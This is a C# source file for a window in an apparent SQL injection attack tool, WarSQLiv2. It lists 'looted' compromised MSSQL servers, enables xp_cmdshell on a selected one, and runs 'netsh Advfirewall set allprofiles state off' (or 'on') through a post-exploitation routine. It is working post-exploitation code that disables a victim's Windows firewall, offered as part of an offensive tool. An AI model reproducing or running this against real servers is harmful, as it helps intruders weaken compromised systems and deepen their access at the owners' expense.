using System;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Threading;
using WarSQLiv2.Exploitation.Control;
using WarSQLiv2.Exploitation.PostExploitation;

namespace WarSQLiv2.UserControls.Attack.MSSQL
{
    /// <summary>
    /// Interaction logic for FrmDisableWindowsFirewall.xaml
    /// </summary>
    public partial class FrmDisableWindowsFirewall : Window
    {
        private readonly LanguageControl _languageControl = new LanguageControl();
        public xpCmdShellControl cmdControl = new xpCmdShellControl();
        readonly MsSqlPostExploitation _postExploitation = new MsSqlPostExploitation();
        private int _selectedId = 0;
        public FrmDisableWindowsFirewall()
        {
            InitializeComponent();
        }
        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            _languageControl.FindLang();
            var lootedFileControl = new LootedFileControl();
            try
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    btnDisable.Content = _languageControl.SelectedLanguage.GetString("ButtonDisable");
                    btnEnable.Content = _languageControl.SelectedLanguage.GetString("ButtonEnable");
                    Title = _languageControl.SelectedLanguage.GetString("TitleWindowsFirewall");
                    lootedFileControl.FileControl();
                    var lootedList = lootedFileControl.LootedList;
                    foreach (var t in lootedList)
                    {
                        lstLooted.Items.Add(t);
                    }

                    lstLooted.SelectedIndex = 0;
                    var toolStripControl = new ToolStripInformation
                    {
                        SelectedLootedServer = lstLooted.SelectedItem.ToString(),
                        Command = "sp_server_info",
                    };
                    toolStripControl.SqlServerInformation();
                    lblStrip.Content = string.Empty;
                    lblStrip.Content = toolStripControl.SqlServerInfo;
                });

            }
            catch (Exception exp)
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    txtStatus.AppendText(lootedFileControl.Exception);
                });
            }
        }
        private void btnEnable_Click(object sender, RoutedEventArgs e)
        {
            var isActivated = cmdControl.isActivated;
            var isExecuted = cmdControl.isExecuted;
            if (isActivated == false && isExecuted == false)
            {
                var enableXpCmdShell = new EnableXpCmdShell { LootedServer = lstLooted.SelectedItem.ToString() };
                try
                {
                    Dispatcher.Invoke((Action)delegate
                    {
                        enableXpCmdShell.XpCmdShellStatus();
                        txtStatus.AppendText(enableXpCmdShell.Result);
                        var cmdLandResult = _languageControl.SelectedLanguage.GetString("XPCmdShell2");
                        var contains = enableXpCmdShell.Result.Contains(cmdLandResult);
                        if (contains == true)
                        {
                            isActivated = true;
                            isExecuted = true;
                        }
                    });
                }
                catch (Exception)
                {
                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                    {
                        txtStatus.AppendText(enableXpCmdShell.CmdException);
                    });
                }
            }
            if (isExecuted == true && isActivated == true)
            {
                if (lstLooted.SelectedIndex != -1)
                {
                    try
                    {
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                        {
                            _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
                            _postExploitation.SqlCommand = "netsh Advfirewall set allprofiles state on";
                            _postExploitation.SqlExploitation();
                            txtStatus.AppendText(Environment.NewLine + _postExploitation.ExploitResult.Replace("\r", "").Replace("\n", ""));
                        });
                    }
                    catch (Exception exp)
                    {
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                        {
                            txtStatus.AppendText(string.Format(_languageControl.SelectedLanguage.GetString("Exception1"), Environment.NewLine, exp.Message));
                        });
                    }
                }
                else
                {
                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                    {
                        txtStatus.AppendText($"{Environment.NewLine}{_languageControl.SelectedLanguage.GetString("MessageExploitError1")}");
                    });
                }
            }
        }
        private void btnDisable_Click(object sender, RoutedEventArgs e)
        {
            var isActivated = cmdControl.isActivated;
            var isExecuted = cmdControl.isExecuted;
            if (isActivated == false && isExecuted == false)
            {
                var enableXpCmdShell = new EnableXpCmdShell { LootedServer = lstLooted.SelectedItem.ToString() };
                try
                {
                    Dispatcher.Invoke((Action)delegate
                    {
                        enableXpCmdShell.XpCmdShellStatus();
                        txtStatus.AppendText(enableXpCmdShell.Result);
                        var cmdLandResult = _languageControl.SelectedLanguage.GetString("XPCmdShell2");
                        var contains = enableXpCmdShell.Result.Contains(cmdLandResult);
                        if (contains == true)
                        {
                            isActivated = true;
                            isExecuted = true;
                        }
                    });
                }
                catch (Exception)
                {
                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                    {
                        txtStatus.AppendText(enableXpCmdShell.CmdException);
                    });
                }
            }
            if (isExecuted == true && isActivated == true)
            {
                if (lstLooted.SelectedIndex != -1)
                {
                    try
                    {
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                        {
                            _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
                            _postExploitation.SqlCommand = "netsh Advfirewall set allprofiles state off";
                            _postExploitation.SqlExploitation();
                            txtStatus.AppendText(Environment.NewLine + _postExploitation.ExploitResult.Replace("\r", "").Replace("\n", ""));
                        });
                    }
                    catch (Exception exp)
                    {
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                        {
                            txtStatus.AppendText(string.Format(_languageControl.SelectedLanguage.GetString("Exception1"), Environment.NewLine, exp.Message));
                        });
                    }
                }
                else
                {
                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                    {
                        txtStatus.AppendText($"{Environment.NewLine}{_languageControl.SelectedLanguage.GetString("MessageExploitError1")}");
                    });
                }
            }
        }
        private void lstLooted_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            try
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    _selectedId = 0;
                    _selectedId = lstLooted.SelectedIndex;
                    lblStrip.Content = string.Empty;
                    var toolStripControl = new ToolStripInformation
                    {
                        SelectedLootedServer = lstLooted.SelectedItem.ToString(),
                        Command = "sp_server_info",
                    };
                    toolStripControl.SqlServerInformation();
                    lblStrip.Content = toolStripControl.SqlServerInfo;
                });

            }
            catch (Exception exp)
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                });
            }
        }
    }
}
